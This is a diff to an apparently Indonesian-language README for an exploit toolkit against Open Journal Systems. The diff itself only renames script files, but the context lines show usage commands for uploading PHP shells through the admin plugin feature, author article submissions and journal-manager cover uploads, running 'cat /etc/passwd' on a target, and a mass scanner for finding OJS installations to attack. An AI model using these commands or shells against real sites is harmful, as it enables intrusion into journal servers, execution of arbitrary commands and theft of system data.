@@ -32,12 +32,12 @@ pip install httpx colorama
 Upload plugin ZIP berisi PHP shell ke endpoint admin, lalu eksekusi command.
 
 ```bash
-python ojs_exploit.py plugin https://target.com -u admin -p password123
+python ojs-exploit.py plugin https://target.com -u admin -p password123
 ```
 
 ```bash
 # Custom command
-python ojs_exploit.py plugin https://target.com -u admin -p password123 --cmd "cat /etc/passwd"
+python ojs-exploit.py plugin https://target.com -u admin -p password123 --cmd "cat /etc/passwd"
 ```
 
 **Alur:**
@@ -53,7 +53,7 @@ python ojs_exploit.py plugin https://target.com -u admin -p password123 --cmd "c
 Upload file arbitrary via fitur submission artikel (author role — bisa self-register).
 
 ```bash
-python ojs_exploit.py submission https://target.com -u author -p pass -f shell.php -j namajournal
+python ojs-exploit.py submission https://target.com -u author -p pass -f shell.php -j namajournal
 ```
 
 | Flag | Keterangan |
@@ -70,7 +70,7 @@ python ojs_exploit.py submission https://target.com -u author -p pass -f shell.p
 Upload file via fitur cover image / stylesheet journal manager.
 
 ```bash
-python ojs_exploit.py jmupload https://target.com -u jmanager -p pass -f file.php -j namajournal
+python ojs-exploit.py jmupload https://target.com -u jmanager -p pass -f file.php -j namajournal
 ```
 
 ---
@@ -108,8 +108,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 | File | Fungsi |
 |---|---|
-| `ojs_scanner.py` | Mass scan domain untuk deteksi instalasi OJS & versi |
-| `ojs_exploit.py` | Eksploitasi OJS yang ditemukan scanner |
+| `ojs-scanner.py` | Mass scan domain untuk deteksi instalasi OJS & versi |
+| `ojs-exploit.py` | Eksploitasi OJS yang ditemukan scanner |
 
 **Workflow:**
 ```bash
